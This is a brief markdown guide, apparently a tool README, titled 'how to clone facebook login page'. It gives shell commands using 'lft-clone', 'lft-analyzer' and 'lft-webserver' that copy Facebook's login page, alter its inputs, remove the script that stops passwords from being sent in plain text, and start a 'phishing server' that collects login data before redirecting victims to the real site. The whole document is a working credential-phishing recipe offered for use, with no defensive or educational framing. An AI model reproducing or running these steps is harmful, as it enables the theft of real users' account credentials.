# how to clone facebook login page
### steps
- clone login page<br>
  ```sh
  $: lft-clone clone https://www.facebook.com/login
  ```
- use parser to change page login inputs<br>
  ```sh
  $: lft-analyzer modify clone.html 
  ```
- remove the script that does not allow the password to be sent in plain text to the server
  ```sh
  $: lft-analyzer remove clone.html -s 'script[src~="https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/MTfFXMprGyn.js?_nc_x=Ij3Wp8lg5Kz"]' -u 
  ```
  
- start the phishing server to receive the login data, and redirect to the official facebook<br>
  ```sh
  $: lft-webserver listen 8080 -f clone.html -r https://facebook.com
  ```
